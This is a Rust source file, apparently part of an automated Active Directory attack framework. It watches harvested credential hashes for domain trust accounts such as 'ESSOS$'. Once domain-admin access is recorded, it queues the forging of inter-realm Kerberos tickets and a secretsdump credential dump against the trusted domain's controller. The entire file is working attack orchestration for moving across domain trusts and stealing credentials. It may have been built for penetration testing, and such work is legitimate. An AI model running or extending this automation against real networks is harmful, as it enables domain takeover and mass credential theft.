//! auto_trust_follow -- cross-domain attacks when trust keys are discovered.
//!
//! When a trust account hash (e.g. `ESSOS$`) is found via secretsdump and the
//! account name ends with `$`, this automation dispatches:
//!   1. Inter-realm TGT creation (create_inter_realm_ticket)
//!   2. Secretsdump against the foreign domain DC
//!
//! This mirrors the Python `_auto_dispatch_trust_key_extraction_threaded()`.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::dispatcher::Dispatcher;
use crate::state::*;

/// Monitors for trust account hashes and dispatches cross-domain attacks.
/// Interval: 30s.
pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        let work: Vec<TrustFollowWork> = {
            let state = dispatcher.state.read().await;

            // Skip if no domain admin yet — trust extraction requires DA-level creds
            if !state.has_domain_admin {
                continue;
            }

            state
                .hashes
                .iter()
                .filter_map(|hash| {
                    // Trust accounts end with $ (e.g. ESSOS$, CHILD$)
                    if !hash.username.ends_with('$') {
                        return None;
                    }

                    let dedup_key = format!(
                        "{}:{}",
                        hash.domain.to_lowercase(),
                        hash.username.to_lowercase()
                    );
                    if state.is_processed(DEDUP_TRUST_FOLLOW, &dedup_key) {
                        return None;
                    }

                    // The trust account name (minus $) is the target domain's
                    // NetBIOS name. Try to resolve to FQDN.
                    let target_netbios = hash.username.trim_end_matches('$');
                    let target_domain = state
                        .netbios_to_fqdn
                        .get(&target_netbios.to_uppercase())
                        .cloned()
                        .unwrap_or_else(|| target_netbios.to_lowercase());

                    // Try to find a DC for the target domain
                    let target_dc = state
                        .domain_controllers
                        .get(&target_domain.to_lowercase())
                        .cloned();

                    // Get our domain SID for the inter-realm ticket
                    let source_domain_sid =
                        state.domain_sids.get(&hash.domain.to_lowercase()).cloned();

                    Some(TrustFollowWork {
                        dedup_key,
                        hash: hash.clone(),
                        target_domain,
                        target_dc_ip: target_dc,
                        source_domain_sid,
                    })
                })
                .collect()
        };

        for item in work {
            // 1. Dispatch inter-realm ticket creation
            let mut ticket_payload = json!({
                "technique": "create_inter_realm_ticket",
                "domain": item.hash.domain,
                "target_domain": item.target_domain,
                "trust_hash": item.hash.hash_value,
                "trust_account": item.hash.username,
            });
            if let Some(ref sid) = item.source_domain_sid {
                ticket_payload["domain_sid"] = json!(sid);
            }
            if let Some(ref aes) = item.hash.aes_key {
                ticket_payload["aes_key"] = json!(aes);
            }

            match dispatcher
                .throttled_submit("exploit", "privesc", ticket_payload, 1)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        trust_account = %item.hash.username,
                        target_domain = %item.target_domain,
                        "Inter-realm ticket task dispatched"
                    );
                }
                Ok(None) => {
                    debug!("Inter-realm ticket deferred by throttler");
                    continue; // Don't mark as processed; try again next cycle
                }
                Err(e) => {
                    warn!(err = %e, "Failed to dispatch inter-realm ticket");
                    continue;
                }
            }

            // 2. If we know the target DC, dispatch secretsdump against it
            if let Some(ref dc_ip) = item.target_dc_ip {
                let sd_payload = json!({
                    "technique": "secretsdump",
                    "target_ip": dc_ip,
                    "domain": item.target_domain,
                    "trust_account": item.hash.username,
                    "trust_hash": item.hash.hash_value,
                });

                match dispatcher
                    .throttled_submit("credential_access", "credential_access", sd_payload, 2)
                    .await
                {
                    Ok(Some(task_id)) => {
                        info!(
                            task_id = %task_id,
                            target_dc = %dc_ip,
                            target_domain = %item.target_domain,
                            "Cross-domain secretsdump dispatched"
                        );
                    }
                    Ok(None) => {}
                    Err(e) => warn!(err = %e, "Failed to dispatch cross-domain secretsdump"),
                }
            }

            // Mark as processed
            dispatcher
                .state
                .write()
                .await
                .mark_processed(DEDUP_TRUST_FOLLOW, item.dedup_key.clone());
            let _ = dispatcher
                .state
                .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &item.dedup_key)
                .await;
        }
    }
}

struct TrustFollowWork {
    dedup_key: String,
    hash: ares_core::models::Hash,
    target_domain: String,
    target_dc_ip: Option<String>,
    source_domain_sid: Option<String>,
}
